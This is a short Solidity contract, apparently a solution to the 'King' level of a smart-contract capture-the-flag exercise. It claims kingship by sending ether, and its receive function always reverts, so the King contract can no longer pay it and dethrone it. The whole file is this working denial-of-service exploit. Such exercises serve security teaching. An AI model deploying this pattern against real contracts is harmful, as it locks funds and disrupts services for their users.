// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../king/King.sol";

contract KingHack {
    function sendPayment(address king) external payable {
        (bool success, ) = payable(address(king)).call{value: msg.value}("");
        require(success, "External call failed");
    }

    receive () external payable {
        require(!true, "Ha Ha Ha");
    }
}
